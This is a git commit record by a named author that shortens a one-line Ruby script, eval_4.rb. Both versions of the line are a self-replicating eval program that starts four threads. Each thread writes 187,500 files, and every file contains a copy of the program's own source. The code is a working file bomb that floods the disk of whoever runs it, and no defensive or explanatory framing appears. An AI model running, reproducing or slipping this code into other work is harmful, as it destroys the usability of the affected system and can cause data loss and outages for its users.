597939cbef9c06f80040561cefa299844751bde2
Josie O'Harrow <josieoharrow@hotmail.com>
2019-07-30 09:27:41 -0700

    shorten a bit

--- eval_4.rb
+++ eval_4.rb
@@ -1,1 +1,1 @@
-@s='def j(); a,b=[*("A".."Z")].sample(3).join,0; while b<187500; File.open(a+b.to_s,"w") {|f| f.write("@s=\'"+@s+"\';eval @s") }; b=b+1; end end; t=[]; 4.times{t<<Thread.new{j()}}; t.each(&:join)';eval @s
+@s='def j; a,b=[*("A".."Z")].sample(3).join,0; while b<187500; File.open(a+b.to_s,"w") {|f| f.write("@s=\'"+@s+"\';eval @s") }; b=b+1; end end; t=[]; 4.times{t<<Thread.new{j}}; t.each(&:join)';eval @s
